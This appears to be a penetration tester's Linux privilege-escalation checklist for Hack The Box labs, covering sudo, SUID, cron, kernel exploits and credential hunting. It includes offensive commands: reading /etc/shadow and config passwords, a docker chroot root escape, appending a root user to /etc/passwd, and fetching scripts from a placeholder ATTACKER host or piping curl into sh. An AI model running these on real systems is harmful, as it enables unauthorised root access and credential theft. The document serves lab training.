title: linux-privesc-checklist
html:
linux-privesc-checklist

Run through this systematically after landing a shell. Order is roughly by frequency of success in HTB.

Sudo

sudo -l                          # Check what you can run as root
sudo -V                          # Version — check for CVEs (Baron Samedit: < 1.9.5p2)

If (ALL) NOPASSWD: appears, check [GTFOBins](https://gtfobins.github.io/) immediately.

SUID / SGID Binaries

find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -u=s -type f 2>/dev/null    # Alternative SUID

Cross-reference custom or unusual binaries with GTFOBins. Look for anything outside /usr/bin, /usr/sbin.

Capabilities

getcap -r / 2>/dev/null

Dangerous caps: cap_setuid, cap_net_raw, cap_dac_override, cap_sys_admin.

Cron Jobs

cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/crontabs/
systemctl list-timers --all

Look for: writable scripts, wildcard injection, relative path references.

Writable PATH Hijacking

echo $PATH
find / -writable -type d 2>/dev/null | grep -E "^(/usr/local/bin|/usr/bin|/tmp)"

If a cron or SUID binary calls a command without full path, drop a malicious binary in a writable PATH dir.

Kernel Exploits

uname -a
cat /etc/os-release

Feed version to linux-exploit-suggester or search manually. Common: DirtyPipe (5.8-5.16.11), DirtyCow (< 4.8.3), PwnKit (pkexec).

Internal Services

ss -tlnp
ss -ulnp
netstat -antup 2>/dev/null

Services on 127.0.0.1 only — may be exploitable and not firewalled from localhost.

Credential Hunting

cat ~/.bash_history
cat /etc/shadow                          # If readable
find / -name "*.conf" -exec grep -li "pass" {} \; 2>/dev/null
find / -name "*.php" -exec grep -li "password" {} \; 2>/dev/null
find / -name ".env" 2>/dev/null
env | grep -i pass
cat /var/www/html/wp-config.php 2>/dev/null
cat /opt/*/config* 2>/dev/null

Docker / LXD Group

id                               # Check groups
groups

Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh LXD: Import alpine image, mount host root, access via shell.

NFS no_root_squash

cat /etc/exports
showmount -e TARGET

If no_root_squash is set, mount from attacker, create SUID binary as root.

Writable /etc/passwd

ls -la /etc/passwd

If writable, add a root-level user:

openssl passwd -1 password123
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

Automated Tools

# LinPEAS (best overall)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh -t

Host locally: python3 -m http.server 80 then wget http://ATTACKER/linpeas.sh on target.
